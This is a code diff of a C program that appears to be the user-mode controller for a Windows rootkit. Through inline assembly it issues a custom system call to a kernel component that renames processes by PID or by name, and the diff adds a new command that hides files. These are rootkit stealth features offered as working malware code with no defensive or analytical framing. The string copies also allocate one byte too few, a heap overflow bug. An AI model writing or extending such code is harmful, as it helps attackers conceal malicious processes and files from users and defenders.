@@ -23,14 +23,15 @@ __declspec(naked) void SysCall(void) {
 int main(int argc, char* argv[]) {
 	
 	COMMAND cmd;
+	unsigned int len;
 
 	memset(&cmd, 0, sizeof(COMMAND));
 
 	if (argc > 1) {
 		if (!strcmp(argv[1], "0x26")) {
-			cmd.type = TestCommand;
-			cmd.bufByte = NULL;
-			cmd.bufInt = 0;
+			cmd.flags = COMMAND_TEST_COMMAND;
+			cmd.target = NULL;
+			cmd.change = NULL;
 			unsigned int cc = (unsigned int)NULL;
 			__asm {
 				push 0
@@ -45,10 +46,13 @@ int main(int argc, char* argv[]) {
 		}
 		// RENAME PROCESS PID
 		else if (!strcmp(argv[1], "rpid")) {
-			if (argc == 3) {
-				cmd.bufInt = (unsigned int)strtoul(argv[2], NULL, 0);
-				cmd.bufByte = NULL;
-				cmd.type = RenameProcess;
+			if (argc == 4) {
+				len = strlen(argv[3]);
+				cmd.change = malloc(len);
+				strcpy((char*)cmd.change, argv[3]);
+
+				cmd.target = (void*)strtoul(argv[2], NULL, 0);
+				cmd.flags = COMMAND_RENAME_PROCESS | COMMAND_BUFFER_NUMBER;
 
 				__asm {
 					push 0
@@ -65,12 +69,16 @@ int main(int argc, char* argv[]) {
 		}
 		// RENAME PROCESS NAME
 		else if (!strcmp(argv[1], "rname")) {
-			if (argc == 3) {
-				unsigned int len = strlen(argv[2]);
-				cmd.bufInt = 0;
-				cmd.bufByte = (unsigned char*)malloc(len);
-				strcpy(cmd.bufByte, argv[2]);
-				cmd.type = RenameProcess;
+			if (argc == 4) {
+				len = strlen(argv[2]);
+				cmd.target = malloc(len);
+				strcpy((char*)cmd.target, argv[2]);
+
+				len = strlen(argv[3]);
+				cmd.change = malloc(len);
+				strcpy((char*)cmd.change, argv[3]);
+
+				cmd.flags = COMMAND_RENAME_PROCESS | COMMAND_BUFFER_POINTER;
 
 				__asm {
 					push 0
@@ -84,6 +92,26 @@ int main(int argc, char* argv[]) {
 				SysCall();
 			}
 			else printf("Error rename process\n");
+		}
+		else if (!strcmp(argv[1], "hfile")) {
+			if (argc == 3) {
+				len = strlen(argv[2]);
+				cmd.target = malloc(len);
+				strcpy((char*)cmd.target, argv[2]);
+
+				cmd.flags = COMMAND_HIDE_FILE | COMMAND_BUFFER_POINTER;
+
+				__asm {
+					push 0
+					push 0
+					lea eax, cmd
+					push eax
+					push SIGNATURE_SYSCALL
+					mov eax, 0x26
+				}
+				AddressSystemCall = (unsigned int)FastSystemCall;
+				SysCall();
+			}
 		}
 		else if (!strcmp(argv[1], "start")) {
 			char buf[2 * MAX_PATH];
